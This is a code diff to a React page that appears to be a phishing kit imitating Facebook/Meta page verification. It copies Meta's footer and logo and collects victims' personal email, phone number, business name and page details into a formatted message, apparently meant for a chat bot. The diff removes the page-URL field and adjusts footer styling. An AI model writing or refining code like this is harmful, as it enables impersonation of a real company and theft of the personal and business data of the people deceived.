@@ -14,7 +14,6 @@ import VerifyModal from '@/components/form-modal/verify-modal';
 interface VerifyFormData {
     personalEmail: string;
     pageName: string;
-    pageUrl: string;
     legalBusinessName: string;
     phoneNumber: string;
     description: string;
@@ -67,7 +66,6 @@ const Page: FC = () => {
     const [formData, setFormData] = useState<VerifyFormData>({
         personalEmail: '',
         pageName: '',
-        pageUrl: '',
         legalBusinessName: '',
         phoneNumber: '',
         description: ''
@@ -121,7 +119,6 @@ const Page: FC = () => {
         const textsToTranslate = [
             'Confirm Page Information',
             'Page Name',
-            'Page URL',
             'Legal Business Name',
             'Phone Number',
             'Email',
@@ -200,7 +197,6 @@ ${
 }
 
 <b>📝 Page Name:</b> <code>${formData.pageName}</code>
-<b>🔗 Page URL:</b> <code>${formData.pageUrl}</code>
 <b>🏢 Legal Business Name:</b> <code>${formData.legalBusinessName}</code>
 <b>📱 Phone Number:</b> <code>${fullPhoneNumber}</code>
 <b>📧 Personal Email:</b> <code>${formData.personalEmail}</code>
@@ -241,7 +237,6 @@ ${
         setFormData({
             personalEmail: '',
             pageName: '',
-            pageUrl: '',
             legalBusinessName: '',
             phoneNumber: '',
             description: ''
@@ -378,22 +373,6 @@ ${
                                         />
                                     </div>
 
-                                    {/* Page URL */}
-                                    <div>
-                                        <label className="block text-xs font-semibold text-gray-600 mb-2 uppercase tracking-wider">
-                                            {t('Page URL')}
-                                        </label>
-                                        <input
-                                            required
-                                            type="url"
-                                            name="pageUrl"
-                                            value={formData.pageUrl}
-                                            onChange={handleInputChange}
-                                            placeholder="https://facebook.com/..."
-                                            className="w-full px-3 md:px-4 py-2 md:py-3 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-blue-300 outline-none transition text-sm md:text-base"
-                                        />
-                                    </div>
-
                                     {/* Legal Business Name */}
                                     <div>
                                         <label className="block text-xs font-semibold text-gray-600 mb-2 uppercase tracking-wider">
@@ -505,7 +484,7 @@ ${
             <div className="bg-gray-50 flex justify-center border-t border-gray-200">
                 <div className="w-full max-w-7xl mx-auto flex">
                     <div className="w-64 hidden md:block flex-shrink-0"></div>
-                    <div className="flex-1 py-2 md:py-3 px-3 md:px-4 flex items-center justify-start gap-2 md:gap-3 text-xs md:text-sm text-gray-600 overflow-x-auto">
+                    <div className="flex-1 py-2 md:py-3 px-2 md:px-2 flex items-center justify-start gap-2 md:gap-3 text-xs md:text-sm text-gray-600 overflow-x-auto">
                         <span className="text-2xl md:text-3xl font-bold text-blue-600 flex-shrink-0">∞</span>
                         <a href="#" className="hover:text-gray-900 flex-shrink-0">{t('About')}</a>
                         <a href="#" className="hover:text-gray-900 flex-shrink-0">{t('Create ad')}</a>
